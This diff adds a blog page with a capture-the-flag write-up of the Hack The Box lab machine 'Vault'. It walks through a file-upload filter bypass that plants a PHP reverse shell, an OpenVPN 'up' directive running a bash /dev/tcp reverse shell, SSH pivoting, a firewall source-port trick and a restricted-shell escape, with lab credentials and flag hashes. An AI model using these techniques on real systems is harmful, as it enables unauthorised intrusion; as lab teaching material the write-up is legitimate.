@@ -1,0 +1,589 @@
+---
+layout: default
+title: Vault
+---
+
+<h1>Vault</h1>
+<p class="date">06/04/2019</p>
+
+<img class="img-fluid" src="/static/img/htb/vault/vault.png">
+
+<p>I found Vault a pretty tough box being ranked as medium, because it's easy to get an initial shell (it only requires some web fuzzing), but then you need to make several lateral movements through different machines in the right way in order to achieve the flags, besides it requires a basic knowledge of PGP to get root.</p>
+
+<div class="flexcontainer">
+    <a class="link-box" href="#user">User</a>
+    <a class="link-box" href="#privesc">Privilege Escalation</a>
+</div>
+
+<hr>
+
+<h2 id="user">User</h2>
+
+<p>First run <code>nmap</code> to see only ports <code>22</code> and <code>80</code> are open.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/vault# nmap -sC -sV 10.10.10.109
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-07 14:55 UTC
+Nmap scan report for 10.10.10.109
+Host is up (0.16s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)
+|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)
+|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.96 seconds
+</pre>
+
+<p>In the main page of the Apache server we have the following text.</p> 
+
+<img class="img-fluid" src="/static/img/htb/vault/1.png">
+
+<p>As the page talks about a client <i>Sparklays</i> we look for some web content with <code>wfuzz</code> in <code>/sparklays</code> directory and we can find the following sites.</p> 
+
+<pre class="prettyprint">
+root@kali:~/htb/vault# wfuzz -w /usr/share/wordlists/dirb/common.txt -z list,-.php-.html --hc 404,403 http://10.10.10.109/sparklays/FUZZFUZ2Z
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.3.1 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.109/sparklays/FUZZFUZ2Z
+Total requests: 13842
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000857:  C=200     13 L	      38 W	    615 Ch	  "admin - .php"
+000868:  C=200     13 L	      38 W	    615 Ch	  "admin.php - "
+003694:  C=301      9 L	      28 W	    323 Ch	  "design - "
+007040:  C=200      3 L	       2 W	     16 Ch	  "login - .php"
+</pre>
+
+<p>In <code>/sparklays/admin.php</code> we have an admin login panel, but after trying some default credentials and obtain nothing I left this behind.</p> 
+
+<img class="img-fluid" src="/static/img/htb/vault/2.png">
+
+<p>In the other site, <code>/sparklays/login.php</code>, we have a simple message.</p>
+
+<img class="img-fluid" src="/static/img/htb/vault/3.png">
+
+<p>We look for more web content on <code>/sparklays/design</code> directory.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/vault# wfuzz -w /usr/share/wordlists/dirb/common.txt -z list,-.php-.html --hc 404,403 http://10.10.10.109/sparklays/design/FUZZFUZ2Z
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.3.1 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.109/sparklays/design/FUZZFUZ2Z
+Total requests: 13842
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+003696:  C=200      3 L	       8 W	     72 Ch	  "design - .html"
+012646:  C=301      9 L	      28 W	    331 Ch	  "uploads - "
+</pre>
+
+<p>In <code>/sparklays/design/design.html</code> we have a page with just a link.</p>
+
+<img class="img-fluid" src="/static/img/htb/vault/4.png">
+
+<p>If we click on it we get redirected to a form where we can upload files. The <code>/sparklays/design/uploads</code> directory (also on <code>wfuzz</code> output) it's likely to be storing those uploaded files.</p>
+
+<img class="img-fluid" src="/static/img/htb/vault/5.png">
+
+<p>We're going to upload a <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php reverse shell</a> there to gain access to the machine, but if we try to upload a <code>.php</code> file we get <i>"sorry that file type is not allowed"</i>, we just have to change the file extension to <code>.php5</code> and we get the file uploaded correctly.</p> 
+
+<p>Access to <code>http://10.10.10.109/sparklays/design/uploads/php-reverse-shell.php5</code>, we get our code executed and if listening on the specified port we get a shell as <code>www-data</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/vault# nc -nlvp 6969
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::6969
+Ncat: Listening on 0.0.0.0:6969
+Ncat: Connection from 10.10.10.109.
+Ncat: Connection from 10.10.10.109:49780.
+Linux ubuntu 4.13.0-45-generic #50~16.04.1-Ubuntu SMP Wed May 30 11:18:27 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+ 07:43:29 up  3:10,  3 users,  load average: 0.09, 0.04, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+dave     pts/11   10.10.14.80      06:36   22.00s  0.12s  0.05s python3 -c import pty;pty.spawn("/bin/bash")
+dave     pts/16   127.0.0.1        06:42   60.00s  0.08s  0.08s -bash
+dave     pts/18   10.10.13.91      07:40    9.00s  0.20s  0.20s -bash
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+</pre>
+
+<p>Doing some simple enumeration we can find the following files in Dave's desktop which we can read.</p>
+
+<pre class="prettyprint">
+$ ls -la /home/dave/Desktop
+total 20
+drwxr-xr-x  2 dave dave 4096 Sep  3 06:51 .
+drwxr-xr-x 18 dave dave 4096 Sep  3 08:34 ..
+-rw-rw-r--  1 alex alex   74 Jul 17  2018 Servers
+-rw-rw-r--  1 alex alex   14 Jul 17  2018 key
+-rw-rw-r--  1 alex alex   20 Jul 17  2018 ssh
+</pre>
+
+<p>We have some interesting information here: in <code>Servers</code> some network information, in <code>key</code> what it seems to be a password and in <code>ssh</code> probably the ssh credentials.</p>
+
+<pre class="prettyprint">
+$ cat Servers
+DNS + Configurator - 192.168.122.4
+Firewall - 192.168.122.5
+The Vault - x
+$ cat key
+itscominghome
+$ cat ssh
+dave
+Dav3therav3123
+</pre>
+
+<p>We can use those ssh credentials to get a more stable shell as <code>dave</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/vault# ssh dave@10.10.10.109
+dave@10.10.10.109's password: Dav3therav3123
+Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-45-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+222 packages can be updated.
+47 updates are security updates.
+
+Last login: Thu Feb  7 07:47:56 2019 from 10.10.16.35
+dave@ubuntu:~$ 
+</pre>
+
+<p>Now we can see the admin panel and the login page code to confirm those were just rabbit holes.</p>
+
+<pre class="prettyprint long">
+dave@ubuntu:/var/www/html/sparklays$ cat login.php 
+access denied
+
+
+dave@ubuntu:/var/www/html/sparklays$ cat admin.php 
+&lt;div class="container">
+&lt;form action ="admin.php" method="GET">
+        &lt;h2 class="form-signin-heading">Please Login&lt;/h2>
+        &lt;div class="input-group">
+	  &lt;span class="input-group-addon" id="basic-addon1">username&lt;/span>
+	  &lt;input type="text" name="username" class="form-control" placeholder="username" required>
+	&lt;/div>
+        &lt;label for="inputPassword" class="sr-only">Password&lt;/label>
+        &lt;input type="password" name="password" id="inputPassword" class="form-control" placeholder="Password" required>
+        &lt;button class="btn btn-lg btn-primary btn-block" type="submit">Login&lt;/button>
+
+      &lt;/form>
+&lt;?php
+$username =$_GET["username"];
+$domain = $_SERVER["SERVER_NAME"];
+$requri = $_SERVER['REQUEST_URI'];
+if (($domain == "localhost") )  { 
+   Header( "Welcome Dave" ); 
+   header("location: sparklays-local-admin-interface-0001.php
+  "); 
+}
+
+else if (($username == "dave")) {
+  setcookie(sparklaysdatastorage.htb-unbreakable-cookie);
+
+}
+
+?>
+</pre>
+
+<p>As we saw in <code>Servers</code> file we have more machines on this network (<code>192.168.122.4 [DNS + Configurator]</code>, <code>192.168.122.5 [Firewall]</code> and <code>x [Vault]</code>) and because we don't seem to have any flags in this host, let's use <code>nc</code> to see what services they're running to try to jump.</p>
+
+<pre class="prettyprint">
+dave@ubuntu:/var/www/html/sparklays$ nc -zv 192.168.122.5 1-65535 2>&1 | grep succeeded
+dave@ubuntu:/var/www/html/sparklays$ nc -zv 192.168.122.4 1-65535 2>&1 | grep succeeded
+Connection to 192.168.122.4 22 port [tcp/ssh] succeeded!
+Connection to 192.168.122.4 80 port [tcp/http] succeeded!
+</pre>
+
+<p>We can see we have ssh and some web service available in <code>129.168.122.4</code> (<i>DNS + Configurator</i> machine according to the Servers file).</p> 
+
+<p>Since we don't have <code>curl</code> in this machine and it's always easier to work with a web browser, we're going to make a port forwarding to make accessible <code>192.168.122.4</code> from our local machine.</p>
+
+<p>I'm making a dynamic port forwarding which will allow to make any TCP connection through the ubuntu host if we use <code>proxychains</code>, then we will be able to connect to <code>192.168.122.x</code> network.</p> 
+
+<p class="challenge-description">
+man <b>ssh</b>:<br>
+<b>-f</b> To request ssh to go background.<br>
+<b>-N</b> Do not execute a remote command.<br>
+<b>-D</b> Dynamic port forwarding.
+</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/vault# ssh -fND 1337 dave@10.10.10.109
+dave@10.10.10.109's password: Dav3therav3123
+root@kali:~/htb/vault# 
+</pre>
+
+<p>Next modify proxychains configuration (<code>/etc/proxychains.conf</code>) in our local machine and add the following line to use the specified port to connect with <code>SOCKS5</code>.</p>
+
+<pre class="prettyprint">
+socks5 	127.0.0.1 1337
+</pre>
+
+<p>We can confirm everything works as expected making a <code>curl</code> request through <code>proxychains</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/vault# curl 192.168.122.4
+
+root@kali:~/htb/vault# proxychains curl 192.168.122.4
+ProxyChains-3.1 (http://proxychains.sf.net)
+&lt;h1> Welcome to the Sparklays DNS Server &lt;/h1>
+&lt;p>
+&lt;a href="dns-config.php">Click here to modify your DNS Settings&lt;/a>&lt;br>
+&lt;a href="vpnconfig.php">Click here to test your VPN Configuration&lt;/a>
+</pre>
+
+<p>You can use this configuration in <code>FoxyProxy</code> or in the web browser configuration to also use SOCKS5 as proxy.</p>
+
+<img class="img-fluid" src="/static/img/htb/vault/6.png">
+
+<p>Now we're able to connect to <code>192.168.122.4</code> web page through the web browser.</p>
+
+<img class="img-fluid" src="/static/img/htb/vault/7.png">
+
+<p>The first option redirects us to <code>/dns-config.php</code> but we get a 404 error, so nothing to see here.</p>
+
+<p>The "test your VPN Configuration" link redirects us to <code>/vpnconfig.php</code> where we seem to have a textarea we can use to modify a <code>.ovpn</code> file and a link to test it.</p>
+
+<img class="img-fluid" src="/static/img/htb/vault/8.png">
+
+<p>Meanwhile we had <code>wfuzz</code> running through <code>proxychains</code> to look for more web content and we found a <code>/notes</code> file.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/vault# proxychains wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404,403 http://192.168.122.4/FUZZ
+ProxyChains-3.1 (http://proxychains.sf.net)
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.3.1 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.122.4/FUZZ
+Total requests: 4614
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000001:  C=200      6 L	      25 W	    195 Ch	  ""
+002021:  C=200      6 L	      25 W	    195 Ch	  "index.php"
+002695:  C=200      1 L	       6 W	     36 Ch	  "notes"
+</pre>
+
+<p>Accessing to <code>/notes</code> we have a note containing two filenames: <code>123.ovpn</code> and <code>script.sh</code>.</p>
+
+<img class="img-fluid" src="/static/img/htb/vault/9.png">
+
+<p>They are accessible through the web server, so let's download them to see what's inside.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/vault# proxychains wget 192.168.122.4/123.ovpn
+root@kali:~/htb/vault# proxychains wget 192.168.122.4/script.sh
+...
+root@kali:~/htb/vault# cat 123.ovpn 
+remote 192.168.122.1
+dev tun
+nobind
+script-security 2
+up "/bin/bash -c 'bash -i >& /dev/tcp/192.168.122.1/2323 0>&1'"
+root@kali:~/htb/vault# cat script.sh 
+#!/bin/bash
+sudo openvpn 123.ovpn
+</pre>
+
+<p>The <code>.ovpn</code> file it's the one we can edit and run in <code>/vpnconfig.php</code>.</p>
+
+<p>We could modify the ovpn configuration but since the default one can give us a shell in <code>192.168.122.1</code> (the ubuntu host) let's use it.</p>
+
+<p>Click on <i>Test VPN</i> or access to <code>http://192.168.122.4/vpnconfig.php?function=testvpn</code> to execute the ovpn and if we were listening on the specified port in the ubuntu machine, we get a shell in DNS as root.</p>
+
+<pre class="prettyprint">
+dave@ubuntu:/tmp$ nc -nlvp 2323
+Listening on [0.0.0.0] (family 0, port 2323)
+Connection from [192.168.122.4] port 2323 [tcp/*] accepted (family 2, sport 48334)
+bash: cannot set terminal process group (1089): Inappropriate ioctl for device
+bash: no job control in this shell
+root@DNS:/var/www/html# 
+</pre>
+
+<p>Here we can find the user flag in dave's home folder.</p>
+
+<pre class="prettyprint">
+root@DNS:/home/dave# cat user.txt
+cat user.txt
+<span flag="a4947faa8d4e1f80771d34234bd88c73">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="privesc">Privilege Escalation</h2>
+
+<p>First of all, we can also find a ssh file with some credentials.</p>
+
+<pre class="prettyprint">
+root@DNS:/home/dave# cat ssh
+cat ssh
+dave
+dav3gerous567
+</pre>
+
+<p>We can get a more stable shell using those credentials, instead of using the <code>ovpn</code>.</p>
+
+<pre class="prettyprint">
+dave@ubuntu:~$ ssh dave@192.168.122.4
+dave@192.168.122.4's password: dav3gerous567
+Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+98 packages can be updated.
+50 updates are security updates.
+
+
+Last login: Fri Feb  8 07:53:00 2019 from 192.168.122.1
+dave@DNS:~$ 
+</pre>
+
+<p>In the <code>sudo</code> configuration we can see dave can execute everything as root.</p>
+
+<pre class="prettyprint">
+dave@DNS:~$ sudo -l
+Matching Defaults entries for dave on DNS:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User dave may run the following commands on DNS:
+    (ALL : ALL) ALL
+</pre>
+
+<p>If we check <code>/etc/hosts</code> we can also see the IP for our target machine (Vault) is <code>192.168.5.2</code>.</p>
+
+<pre class="prettyprint">
+dave@DNS:~$ cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	DNS
+192.168.5.2	Vault
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</pre>
+
+<p>After some enumeration we can find some interesting information about the vault host in <code>/var/log/auth.log</code>, where we have all authentication related events.</p>
+
+<pre class="prettyprint">
+dave@DNS:/home$ sudo less /var/log/auth.log
+...
+Sep  2 15:07:51 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f
+...
+Sep  2 15:10:20 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
+...
+Sep  2 15:10:34 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53
+...
+</pre>
+
+<p>If we replicate the <code>nmap</code> command we can see port <code>987</code> is open in <code>192.168.5.2</code>.
+
+<pre class="prettyprint">
+dave@DNS:/home$ sudo /usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2019-02-08 10:33 GMT
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for Vault (192.168.5.2)
+Host is up (0.0042s latency).
+Not shown: 999 closed ports
+PORT    STATE SERVICE
+987/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 43.47 seconds
+</pre>
+
+<p>Looking in <code>netstat</code> we can see there's a connection between the port 53 and 4444 of DNS host and the port 987 of the vault host.</p> 
+
+<pre class="prettyprint">
+dave@DNS:~$ netstat -atun
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        1      0 192.168.122.4:55434     192.168.122.1:4411      CLOSE_WAIT 
+tcp        0      0 192.168.122.4:4444      192.168.5.2:987         TIME_WAIT  
+tcp        0      0 192.168.122.4:53        192.168.5.2:987         TIME_WAIT  
+tcp        6      0 192.168.122.4:55432     192.168.122.1:4411      CLOSE_WAIT 
+tcp        0      0 192.168.122.4:55436     192.168.122.1:4411      ESTABLISHED
+tcp        0      0 192.168.122.4:22        192.168.122.1:47692     ESTABLISHED
+tcp6       0      0 :::80                   :::*                    LISTEN     
+tcp6       0      0 :::22                   :::*                    LISTEN     
+tcp6       0      0 192.168.122.4:80        192.168.122.1:50616     ESTABLISHED
+tcp6       1      0 192.168.122.4:80        192.168.122.1:50556     CLOSE_WAIT 
+tcp6       1      0 192.168.122.4:80        192.168.122.1:50586     CLOSE_WAIT 
+</pre>
+
+<p>In the <code>auth.log</code> we also had a <code>ncat</code> command, let's try it to see what do we get.</p>
+
+<pre class="prettyprint">
+dave@DNS:~$ sudo ncat 192.168.5.2 987 -p 53
+SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
+</pre>
+
+<p>So it seems that only if we use port <code>53</code> or <code>4444</code> as source port, we can connect to a ssh service in vault.</p>
+
+<p>To make the ssh client to run on a specified source port we can use the full command we got in <code>auth.log</code> that makes a port forwarding in the same host.</p>
+
+<pre class="prettyprint">
+dave@DNS:~$ sudo /usr/bin/ncat -l 1234 --sh-exec "ncat 192.168.5.2 987 -p 53"
+</pre>
+
+<p>Since the above command is blocking we could use <code>&</code> to run it on background or open another console in the machine.</p>
+
+<p>Now if we connect to the port specified in the port forwarding at localhost we get the ssh connection to <code>192.168.5.2</code>.</p> 
+
+<pre class="prettyprint">
+dave@DNS:~$ nc localhost 1234
+SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.4
+</pre>
+
+<p>If we run ssh with the same credentials we used in the DNS machine we get access to the vault.</p>
+
+<pre class="prettyprint">
+dave@DNS:~$ ssh dave@localhost -p 1234
+dave@localhost's password: dav3gerous567
+Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+96 packages can be updated.
+49 updates are security updates.
+
+
+Last login: Mon Sep  3 16:48:00 2018
+dave@vault:~$ 
+</pre>
+
+<p>Unfortunately is a restricted shell and we can't execute almost anything.</p>
+
+<pre class="prettyprint">
+dave@vault:~$ cd ..
+-rbash: cd: restricted
+</pre>
+
+<p>We can easily escape that restricted shell using the following ssh command instead.</p>
+
+<pre class="prettyprint">
+dave@DNS:~$ ssh dave@localhost -p 1234 -t "bash --noprofile"
+dave@localhost's password: 
+dave@vault:~$ cd ..
+dave@vault:/home$ 
+</pre>
+
+<p>In dave's home folder we have an interesting file <code>root.txt.gpg</code>.</p>
+
+<pre class="prettyprint">
+dave@vault:~$ ls -la
+total 40
+drwxr-xr-x 5 dave dave 4096 Sep  3 16:47 .
+drwxr-xr-x 4 root root 4096 Jul 17  2018 ..
+-rw------- 1 dave dave   11 Sep  3 16:47 .bash_history
+-rw-r--r-- 1 dave dave  220 Jul 17  2018 .bash_logout
+-rw-r--r-- 1 dave dave 3771 Jul 17  2018 .bashrc
+drwx------ 2 dave dave 4096 Jul 17  2018 .cache
+drwxrwxr-x 2 dave dave 4096 Sep  2 15:11 .nano
+-rw-r--r-- 1 dave dave  655 Jul 17  2018 .profile
+-rw-rw-r-- 1 dave dave  629 Sep  3 14:57 root.txt.gpg
+drwx------ 2 dave dave 4096 Jul 17  2018 .ssh
+</pre>
+
+<p>This is an encrypted pgp message and we need a certain private key to decrypt it.</p>
+
+<pre class="prettyprint">
+dave@vault:~$ file root.txt.gpg
+root.txt.gpg: PGP RSA encrypted session key - keyid: 10C678C7 31FEBD1 RSA (Encrypt or Sign) 4096b .
+</pre>
+
+<p>Unfortunately we don't seem to have it on this host.</p>
+
+<pre class="prettyprint">
+dave@vault:~$ gpg -d root.txt.gpg 
+gpg: directory `/home/dave/.gnupg' created
+gpg: new configuration file `/home/dave/.gnupg/gpg.conf' created
+gpg: WARNING: options in `/home/dave/.gnupg/gpg.conf' are not yet active during this run
+gpg: keyring `/home/dave/.gnupg/secring.gpg' created
+gpg: keyring `/home/dave/.gnupg/pubring.gpg' created
+gpg: encrypted with RSA key, ID D1EB1F03
+gpg: decryption failed: secret key not available
+</pre>
+
+<p>But we do have that private key with ID <code>D1EB1F03</code> in the ubuntu host we first visited.</p>
+
+<pre class="prettyprint">
+dave@ubuntu:~$ gpg --list-secret-keys
+/home/dave/.gnupg/secring.gpg
+-----------------------------
+sec   4096R/0FDFBFE4 2018-07-24
+uid                  david &lt;dave@david.com>
+ssb   4096R/D1EB1F03 2018-07-24
+</pre>
+
+<p>Now we have to move that encrypted message to the ubuntu machine, and since it contains non ascii characters we can't simply copy and paste it. We could move it from machine to machine to ubuntu using <code>scp</code>, but I found easier to convert it to basee64 and copy paste it.</p>
+
+<p>Since we don't have the <code>base64</code> command I used python (<code>python3m</code> because we don't have the default python executable either).</p>
+
+<pre class="prettyprint">
+dave@vault:~$ python3m
+Python 3.5.2 (default, Nov 23 2017, 16:37:01) 
+[GCC 5.4.0 20160609] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import base64
+>>> with open("root.txt.gpg", "rb") as f:
+...     print(base64.b64encode(f.read()))
+... 
+b'hQIMA8d4xhDR6x8DARAAoJjq0xo2bn5JfY3Q6EMVZjkwUK7JPcwUEr1RNUx98k41oOFdtugxUjwHSZ9x9BU9sph696HhlKlPO0au7DeFyxqPFbjR2CdwoT9PBf8vuSEzEqVltvAq31jQbXpUSA2AxYSj3fWKCAkIPcUBTTcJAnac0EMmXlAQzdAmvFEU+9BRkcpJDSpYV8W2IQf+fsnh14hcc5tXZQZX0mPtLlwYVlJq4xgpV3znnJrrlUgKJqkqhq1i2/JEAL5Ul1k5as9Ha1N8KffjmfEsrRQl8TS5NLoC3mVp3w90X0LYhyDcRz7HPzXfdPMdM+G9NEX1zY4c6cr1sxOdLcpUwbZ4itd7XjCA71B23Ncd7eniLGCkErDaVkZh8oa4DyIG78bxqFTDgk6XrH6pz9XRXhDBSZnCezI90WkbxGecOB42cAOwGkuHcnSF44eXDT60Yl9h6bvRZVEQF3/39ee+nMaW5b5PnWzGb/PC4kT3ZDeWYSiloF6a5sOwDO2CL/qipnAFPj8UthhrCCcQj4rRH2zeeh4y9fh3m3G37Q+U9lNgpjzj0nzVCfjdrMRvUs5itxwpjwaxN6q2q1kxe1DhPCzaAHhLT7We7p2hxdSj1yPgefSzJ39GENgJI1fbTDEaMzwkPra4I2MiJCEVgZnV29oRHPYrmGsfx4tSkBy6tJW342/s88fSZAFwRHa6C9Hrr7GSVucoJ5z2kNKAPnS/cUmBc3OdeJlMxdfzQTMucmv89wwgNgKNLO6wmSFppVRnpmLE+AFoCEqg/JS91N5mVhZPkHwW6V94CxMF/3xqTMKpzBfdERq0MGYij98='
+</pre>
+
+<p>Copy and paste to the ubuntu machine and base64 decode it back.</p>
+
+<pre class="prettyprint">
+dave@ubuntu:/tmp$ echo -n hQIMA8d4xh...Yij98= | base64 -d > caca
+</pre>
+
+<p>Now we can decrypt it using the password we found at the beginning in the key file (<code>itscominghome</code>) and get the root flag.</p>
+
+<pre class="prettyprint">
+dave@ubuntu:/tmp$ gpg -d caca
+
+You need a passphrase to unlock the secret key for
+user: "david &lt;dave@david.com>"
+4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)
+
+gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24
+      "david &lt;dave@david.com>"
+<span flag="ca468370b91d1f5906e31093d9bfe819">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
